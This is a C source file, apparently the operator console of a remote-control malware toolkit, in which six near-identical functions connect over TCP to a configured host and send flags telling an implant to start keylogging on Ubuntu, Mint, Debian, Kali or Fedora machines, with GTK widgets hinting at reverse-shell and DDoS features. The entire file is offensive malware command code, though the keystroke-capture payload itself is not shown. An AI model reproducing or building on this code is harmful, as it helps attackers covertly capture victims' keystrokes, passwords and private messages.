#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>  //gethostbyaddr()

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <string.h>

#include <gtk-2.0/gtk/gtk.h>

#include "../includes/constants.h"
#include "../includes/keylogger.h"


const gchar *server_ip;
const char *server_port;
int port;

GtkWidget *text_view;
GtkWidget *rs_text_view;
GtkWidget *ddos_text_view;

void ubuntu16_init_keylogger()
{
    SOCKET keylogger_sock;
    SOCKADDR_IN sin;
    socklen_t recsize = sizeof(sin);

    struct hostent *he = NULL;
    struct in_addr ipv4addr;

    int err = 0;
    size_t flag_keylogger = 1;

    GtkTextBuffer *text_buffer = NULL;
    gchar *text = NULL;
    GtkTextIter start;
    GtkTextIter end;

    port = atoi(server_port);

    inet_pton(AF_INET, server_ip, &ipv4addr);
    he = gethostbyaddr(&ipv4addr, sizeof ipv4addr, AF_INET);

    memset(&sin, 0, sizeof(sin));
    sin.sin_addr = *((struct in_addr *)he->h_addr);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);


    keylogger_sock = socket(AF_INET, SOCK_STREAM, 0);
    if(keylogger_sock == SOCKET_ERROR)
    {
        error("socket() keylogger_sock", "ubuntu16_init_keylogger()");
        return;
    }

    err = connect(keylogger_sock, (SOCKADDR*)&sin, recsize);
    if(err == SOCKET_ERROR)
    {
        error("connect()", "ubuntu16_init_keylogger()");
        return;
    }

    if(send(keylogger_sock, (char*)&flag_keylogger, sizeof(flag_keylogger), 0) == SOCKET_ERROR)
    {
        error("send() flag_keylogger", "ubuntu16_init_keylogger()");
        return;
    }

    /* Obtaining the buffer associated with the widget. */
    text_buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(text_view));

    /* Set the default buffer text. */
    gtk_text_buffer_set_text(text_buffer, "Keylogger Ubuntu 16 is running ...", -1);

    /* Obtain iters for the start and end of points of the buffer */
    gtk_text_buffer_get_start_iter(text_buffer, &start);
    gtk_text_buffer_get_end_iter(text_buffer, &end);

    /* Get the entire buffer text. */
    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);

    /* Print the text */
    g_print("%s", text);

    g_free(text);

    return;
}

void ubuntu18_init_keylogger()
{
    SOCKET keylogger_sock;
    SOCKADDR_IN sin;
    socklen_t recsize = sizeof(sin);

    struct hostent *he = NULL;
    struct in_addr ipv4addr;

    int err = 0;
    size_t flag_keylogger = 2;

    GtkTextBuffer *text_buffer = NULL;
    gchar *text = NULL;
    GtkTextIter start;
    GtkTextIter end;

    port = atoi(server_port);

    inet_pton(AF_INET, server_ip, &ipv4addr);
    he = gethostbyaddr(&ipv4addr, sizeof ipv4addr, AF_INET);

    memset(&sin, 0, sizeof(sin));
    sin.sin_addr = *((struct in_addr *)he->h_addr);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);


    keylogger_sock = socket(AF_INET, SOCK_STREAM, 0);
    if(keylogger_sock == SOCKET_ERROR)
    {
        error("socket() keylogger_sock", "ubuntu18_init_keylogger()");
        return;
    }

    err = connect(keylogger_sock, (SOCKADDR*)&sin, recsize);
    if(err == SOCKET_ERROR)
    {
        error("connect()", "ubuntu18_init_keylogger()");
        return;
    }

    if(send(keylogger_sock, (char*)&flag_keylogger, sizeof(flag_keylogger), 0) == SOCKET_ERROR)
    {
        error("send() flag_keylogger", "ubuntu18_init_keylogger()");
        return;
    }

    /* Obtaining the buffer associated with the widget. */
    text_buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(text_view));

    /* Set the default buffer text. */
    gtk_text_buffer_set_text(text_buffer, "Keylogger Ubuntu 18 is running ...", -1);

    /* Obtain iters for the start and end of points of the buffer */
    gtk_text_buffer_get_start_iter(text_buffer, &start);
    gtk_text_buffer_get_end_iter(text_buffer, &end);

    /* Get the entire buffer text. */
    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);

    /* Print the text */
    g_print("%s", text);

    g_free(text);

    return;
}

void mint_init_keylogger()
{
    SOCKET keylogger_sock;
    SOCKADDR_IN sin;
    socklen_t recsize = sizeof(sin);

    struct hostent *he = NULL;
    struct in_addr ipv4addr;

    int err = 0;
    size_t flag_keylogger = 3;

    GtkTextBuffer *text_buffer = NULL;
    gchar *text = NULL;
    GtkTextIter start;
    GtkTextIter end;

    port = atoi(server_port);

    inet_pton(AF_INET, server_ip, &ipv4addr);
    he = gethostbyaddr(&ipv4addr, sizeof ipv4addr, AF_INET);

    memset(&sin, 0, sizeof(sin));
    sin.sin_addr = *((struct in_addr *)he->h_addr);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);


    keylogger_sock = socket(AF_INET, SOCK_STREAM, 0);
    if(keylogger_sock == SOCKET_ERROR)
    {
        error("socket() keylogger_sock", "mint_init_keylogger()");
        return;
    }

    err = connect(keylogger_sock, (SOCKADDR*)&sin, recsize);
    if(err == SOCKET_ERROR)
    {
        error("connect()", "mint_init_keylogger()");
        return;
    }

    if(send(keylogger_sock, (char*)&flag_keylogger, sizeof(flag_keylogger), 0) == SOCKET_ERROR)
    {
        error("send() flag_keylogger", "mint_init_keylogger()");
        return;
    }

    /* Obtaining the buffer associated with the widget. */
    text_buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(text_view));

    /* Set the default buffer text. */
    gtk_text_buffer_set_text(text_buffer, "Keylogger Mint 19 is running ...", -1);

    /* Obtain iters for the start and end of points of the buffer */
    gtk_text_buffer_get_start_iter(text_buffer, &start);
    gtk_text_buffer_get_end_iter(text_buffer, &end);

    /* Get the entire buffer text. */
    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);

    /* Print the text */
    g_print("%s", text);

    g_free(text);

    return;
}


void debian_init_keylogger()
{
    SOCKET keylogger_sock;
    SOCKADDR_IN sin;
    socklen_t recsize = sizeof(sin);

    struct hostent *he = NULL;
    struct in_addr ipv4addr;

    int err = 0;
    size_t flag_keylogger = 4;

    GtkTextBuffer *text_buffer = NULL;
    gchar *text = NULL;
    GtkTextIter start;
    GtkTextIter end;

    port = atoi(server_port);

    inet_pton(AF_INET, server_ip, &ipv4addr);
    he = gethostbyaddr(&ipv4addr, sizeof ipv4addr, AF_INET);

    memset(&sin, 0, sizeof(sin));
    sin.sin_addr = *((struct in_addr *)he->h_addr);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);


    keylogger_sock = socket(AF_INET, SOCK_STREAM, 0);
    if(keylogger_sock == SOCKET_ERROR)
    {
        error("socket() keylogger_sock", "debian_init_keylogger()");
        return;
    }

    err = connect(keylogger_sock, (SOCKADDR*)&sin, recsize);
    if(err == SOCKET_ERROR)
    {
        error("connect()", "debian_init_keylogger()");
        return;
    }

    if(send(keylogger_sock, (char*)&flag_keylogger, sizeof(flag_keylogger), 0) == SOCKET_ERROR)
    {
        error("send() flag_keylogger", "debian_init_keylogger()");
        return;
    }

    /* Obtaining the buffer associated with the widget. */
    text_buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(text_view));

    /* Set the default buffer text. */
    gtk_text_buffer_set_text(text_buffer, "Keylogger Debian 9 is running ...", -1);

    /* Obtain iters for the start and end of points of the buffer */
    gtk_text_buffer_get_start_iter(text_buffer, &start);
    gtk_text_buffer_get_end_iter(text_buffer, &end);

    /* Get the entire buffer text. */
    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);

    /* Print the text */
    g_print("%s", text);

    g_free(text);

    return;
}


void kali_init_keylogger()
{
    SOCKET keylogger_sock;
    SOCKADDR_IN sin;
    socklen_t recsize = sizeof(sin);

    struct hostent *he = NULL;
    struct in_addr ipv4addr;

    int err = 0;
    size_t flag_keylogger = 5;

    GtkTextBuffer *text_buffer = NULL;
    gchar *text = NULL;
    GtkTextIter start;
    GtkTextIter end;

    port = atoi(server_port);

    inet_pton(AF_INET, server_ip, &ipv4addr);
    he = gethostbyaddr(&ipv4addr, sizeof ipv4addr, AF_INET);

    memset(&sin, 0, sizeof(sin));
    sin.sin_addr = *((struct in_addr *)he->h_addr);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);


    keylogger_sock = socket(AF_INET, SOCK_STREAM, 0);
    if(keylogger_sock == SOCKET_ERROR)
    {
        error("socket() keylogger_sock", "kali_init_keylogger()");
        return;
    }

    err = connect(keylogger_sock, (SOCKADDR*)&sin, recsize);
    if(err == SOCKET_ERROR)
    {
        error("connect()", "kali_init_keylogger()");
        return;
    }

    if(send(keylogger_sock, (char*)&flag_keylogger, sizeof(flag_keylogger), 0) == SOCKET_ERROR)
    {
        error("send() flag_keylogger", "kali_init_keylogger()");
        return;
    }

    /* Obtaining the buffer associated with the widget. */
    text_buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(text_view));

    /* Set the default buffer text. */
    gtk_text_buffer_set_text(text_buffer, "Keylogger Kali 2.0 is running ...", -1);

    /* Obtain iters for the start and end of points of the buffer */
    gtk_text_buffer_get_start_iter(text_buffer, &start);
    gtk_text_buffer_get_end_iter(text_buffer, &end);

    /* Get the entire buffer text. */
    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);

    /* Print the text */
    g_print("%s", text);

    g_free(text);

    return;
}

void fedora_init_keylogger()
{
    SOCKET keylogger_sock;
    SOCKADDR_IN sin;
    socklen_t recsize = sizeof(sin);

    struct hostent *he = NULL;
    struct in_addr ipv4addr;

    int err = 0;
    size_t flag_keylogger = 11;

    GtkTextBuffer *text_buffer = NULL;
    gchar *text = NULL;
    GtkTextIter start;
    GtkTextIter end;

    port = atoi(server_port);

    inet_pton(AF_INET, server_ip, &ipv4addr);
    he = gethostbyaddr(&ipv4addr, sizeof ipv4addr, AF_INET);

    memset(&sin, 0, sizeof(sin));
    sin.sin_addr = *((struct in_addr *)he->h_addr);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);


    keylogger_sock = socket(AF_INET, SOCK_STREAM, 0);
    if(keylogger_sock == SOCKET_ERROR)
    {
        error("socket() keylogger_sock", "fedora_init_keylogger()");
        return;
    }

    err = connect(keylogger_sock, (SOCKADDR*)&sin, recsize);
    if(err == SOCKET_ERROR)
    {
        error("connect()", "fedora_init_keylogger()");
        return;
    }

    if(send(keylogger_sock, (char*)&flag_keylogger, sizeof(flag_keylogger), 0) == SOCKET_ERROR)
    {
        error("send() flag_keylogger", "fedora_init_keylogger()");
        return;
    }

    /* Obtaining the buffer associated with the widget. */
    text_buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(text_view));

    /* Set the default buffer text. */
    gtk_text_buffer_set_text(text_buffer, "Keylogger Fedora 28 is running ...", -1);

    /* Obtain iters for the start and end of points of the buffer */
    gtk_text_buffer_get_start_iter(text_buffer, &start);
    gtk_text_buffer_get_end_iter(text_buffer, &end);

    /* Get the entire buffer text. */
    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);

    /* Print the text */
    g_print("%s", text);

    g_free(text);

    return;
}
